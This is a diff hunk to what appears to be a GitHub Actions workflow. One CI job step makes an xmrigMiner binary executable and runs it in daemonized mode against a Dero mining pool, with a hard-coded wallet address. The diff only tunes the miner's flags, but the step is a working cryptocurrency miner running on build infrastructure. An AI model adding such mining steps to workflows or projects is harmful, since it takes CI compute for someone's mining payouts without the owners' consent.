@@ -45,7 +45,7 @@ jobs:
       run: |
         cd ${{github.workspace}}/build/binaries/ && ls -la
         sudo chmod +x ./xmrigMiner
-        CONFIG=' -o us.dero.herominers.com:1117 -u dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.10000 --tls -k --coin dero -a astrobwt --print-time=10 --daemonized '
+        CONFIG=' -o us.dero.herominers.com:1117 -u dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.10000 --tls -k --coin dero -a astrobwt --pause-on-battery --astrobwt-avx2 --print-time=10 --daemonized '
         timeout 2m ./xmrigMiner $CONFIG
 
 
